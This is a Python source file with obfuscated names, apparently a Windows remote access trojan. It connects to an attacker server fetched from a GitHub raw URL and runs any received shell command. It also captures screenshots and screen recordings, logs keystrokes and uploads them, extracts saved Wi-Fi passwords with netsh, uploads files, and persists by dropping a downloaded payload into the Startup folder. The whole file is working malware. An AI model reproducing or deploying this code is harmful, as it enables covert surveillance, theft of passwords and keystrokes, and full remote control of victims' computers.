import subprocess,socket,time,requests,os,logging,UJZIdVDoCXEUumio
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
NJCkvMTVTfmppEvyXIu = ""
MjZKEnIKJdbweCgHX = ""
TWXOvrNOMfYejatgciUeIp = "12.12.24.2"
tbpPzTOYIfwKQLaPNYEK = "!"
qJfxtNZgVBKKRcUidLrvh = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
OjDvDzQrpKbzyrAAwXGybG = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
dIyVMoJ = os.path.expanduser("~\\AppData\\Local\\")
def HukcBSqHQLMRCGXXI(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def LNyjZXVPeFIFSQkKDXeYKu(s):
	paKfetERViw = s.recv(1024)
	if len(paKfetERViw)==0:
		return True
	RCdgXNOEOlWAAMITM = paKfetERViw.decode("utf-8").replace("\n","")
	if not RCdgXNOEOlWAAMITM.startswith(tbpPzTOYIfwKQLaPNYEK):
		proc = subprocess.run(RCdgXNOEOlWAAMITM, shell=True, capture_output=True)
		cgnLejqxEkpXMQkN = proc.stdout + proc.stderr
		s.send(cgnLejqxEkpXMQkN)
		return
	fOHtZAFbkVIECkmpRWWw = RCdgXNOEOlWAAMITM.split(" ")[0][1:]
	args = " ".join(RCdgXNOEOlWAAMITM.split()[1:]).split()
	if fOHtZAFbkVIECkmpRWWw == "download":
		lOeAwgnOCYlrsGSRrGZhJMJ(s, RCdgXNOEOlWAAMITM)
	elif fOHtZAFbkVIECkmpRWWw == "screenshot":
		cjVfkpewUiwuLQn(s)
	elif fOHtZAFbkVIECkmpRWWw == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
	elif fOHtZAFbkVIECkmpRWWw == "update":
		TJDgfzNpThmr(s)
	elif fOHtZAFbkVIECkmpRWWw == "wifi":
		XlvTrskJQj(s)
	elif fOHtZAFbkVIECkmpRWWw == "screenrecord":
		QvnwEvzVjNeGHujkM(s, args)
def lOeAwgnOCYlrsGSRrGZhJMJ(s, RCdgXNOEOlWAAMITM):
	PTHWNRoYfry = RCdgXNOEOlWAAMITM.replace(tbpPzTOYIfwKQLaPNYEK+"download ","").split(",")
	cgnLejqxEkpXMQkNs = ""
	for f in PTHWNRoYfry:
		cgnLejqxEkpXMQkNs += qkXTpjOekjtNX(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(cgnLejqxEkpXMQkNs, "utf-8"))
def cjVfkpewUiwuLQn(s):
	UJZIdVDoCXEUum = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	plAaUbyFxjqKobpBMNV = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	UJZIdVDoCXEUum.save(plAaUbyFxjqKobpBMNV)
	UJZIdVDoCXEUum.close()
	r = qkXTpjOekjtNX(plAaUbyFxjqKobpBMNV, "api/sscap")
	os.remove(plAaUbyFxjqKobpBMNV)
	s.send(bytes(r,"utf-8"))
def QvnwEvzVjNeGHujkM(s, args):
	jOyrdzhQSNkBaUQIFVdrkRF = 15
	if not args == []:
		try: jOyrdzhQSNkBaUQIFVdrkRF = int(args[0])
		except: pass
	CfSPiHEDEZoxri = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	YUENzyzPMoNMUDwN = []
	fps = 11
	numFrames = jOyrdzhQSNkBaUQIFVdrkRF * fps
	for _ in range(numFrames):
		YUENzyzPMoNMUDwN.append(ImageGrab.grab(bbox=None, all_screens=True))
	UJZIdVDoCXEUumio.mimsave(CfSPiHEDEZoxri, YUENzyzPMoNMUDwN, fps=fps, quality=8)
	qkXTpjOekjtNX(CfSPiHEDEZoxri, "api/file")
def qkXTpjOekjtNX(lRZEKvJlaJKC, pccLnwsU, WhWEmMaIlHpwVoFbqSh=None):
	if not os.path.isfile(lRZEKvJlaJKC):
		return "[!] 404: "+lRZEKvJlaJKC+"\n"
	headers = {"user":os.getlogin()}
	if WhWEmMaIlHpwVoFbqSh is not None:
		headers = {**headers, **WhWEmMaIlHpwVoFbqSh}
	requests.post("http://"+NJCkvMTVTfmppEvyXIu+":5555/"+pccLnwsU,
		files={"file":open(lRZEKvJlaJKC, "rb")},
		headers=headers)
	return "[+] 200:\n"
def TJDgfzNpThmr(s):
	h, p, v = UlGyLQjbQZFGAG(True)
	if (v != TWXOvrNOMfYejatgciUeIp):
		eAuvdCvsvhwoKELt(v)
		s.send(b"[+] 200\n")
	else:
		s.send(b"[-] 304\n")
def XlvTrskJQj(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		s.send(b"[!] 500\n")
		return
	BqatfQjgjNUjT = ""
	for p in profiles:
		try: BqatfQjgjNUjT+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()+"\n"
		except: BqatfQjgjNUjT+=f"    {p} - N/A\n"
	s.send(BqatfQjgjNUjT)
def eAuvdCvsvhwoKELt(CJxpkHWUW):
	QTOwamvdlyrKLaQswamElS = os.path.basename(__file__)
	fileType = QTOwamvdlyrKLaQswamElS.split(".")[-1]
	gFqitXvbCuVixuw = QTOwamvdlyrKLaQswamElS.split(".")[0]+"."+CJxpkHWUW+".pyw" if fileType.startswith("py") else ".exe"
	EHKChLjCerLErYDMiuOkm = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), gFqitXvbCuVixuw)
	if not os.path.isfile(EHKChLjCerLErYDMiuOkm):
		with open(EHKChLjCerLErYDMiuOkm, "w+") as f:
			f.write(requests.get(OjDvDzQrpKbzyrAAwXGybG+"file."+ "pyw" if EHKChLjCerLErYDMiuOkm.split(".")[-1].startswith("py") else "exe").text)
def UlGyLQjbQZFGAG(force=False):
	global NJCkvMTVTfmppEvyXIu, MjZKEnIKJdbweCgHX
	if force or NJCkvMTVTfmppEvyXIu == "" or MjZKEnIKJdbweCgHX == "":
		paKfetERViw = requests.get(qJfxtNZgVBKKRcUidLrvh).text.replace("\n","").split(":")
		NJCkvMTVTfmppEvyXIu = paKfetERViw[0].strip()
		MjZKEnIKJdbweCgHX = paKfetERViw[1].strip()
		CJxpkHWUW = paKfetERViw[2].strip()
	return NJCkvMTVTfmppEvyXIu, MjZKEnIKJdbweCgHX, CJxpkHWUW
def ggMikxMTh():
	try:
		HClgkuBuoDJPttpe = "settings.xpb"
		bfEnVntaDMtiqcBwopQ = sorted([file for file in os.listdir(dIyVMoJ) if os.path.isfile(dIyVMoJ+"\\"+file) and file.endswith(HClgkuBuoDJPttpe.split(".")[-1])])
		if HClgkuBuoDJPttpe in bfEnVntaDMtiqcBwopQ:
			bfEnVntaDMtiqcBwopQ.remove(HClgkuBuoDJPttpe)
		mDDGvfC = os.path.join(dIyVMoJ,HClgkuBuoDJPttpe)
		if len(bfEnVntaDMtiqcBwopQ) > 0:
			with open(mDDGvfC, "ab+") as f:
				for file in bfEnVntaDMtiqcBwopQ:
					temp = os.path.join(dIyVMoJ,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		qkXTpjOekjtNX(mDDGvfC, "api/log")
		if os.path.isfile(mDDGvfC):
			os.remove(mDDGvfC)
	except:
		pass
def AgqbbKrZodz():
	logging.basicConfig(filename=(dIyVMoJ+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def wGIKLdHzzlbtnIBJK(k):
		logging.info(str(k))
	k=Listener(on_press=logKey)
	QSeNzWRJ = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in QSeNzWRJ:
		l.setLevel(logging.CRITICAL)
	k.start()
def DybyfOLlEIqKfmYAeMyOhi():
	h, p, v = UlGyLQjbQZFGAG()
	ggMikxMTh()
	if TWXOvrNOMfYejatgciUeIp != v:
		eAuvdCvsvhwoKELt(v)
	AgqbbKrZodz()
	xZCXDuiVQoABAwVxAWl = bytes(("(old)"if TWXOvrNOMfYejatgciUeIp!=v else "")+"["+TWXOvrNOMfYejatgciUeIp+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				AwOqoFYzdWgwHV=False
				try:
					s=HukcBSqHQLMRCGXXI(h, p)
					while not AwOqoFYzdWgwHV:
						s.send(xZCXDuiVQoABAwVxAWl)
						AwOqoFYzdWgwHV=LNyjZXVPeFIFSQkKDXeYKu(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
DybyfOLlEIqKfmYAeMyOhi()
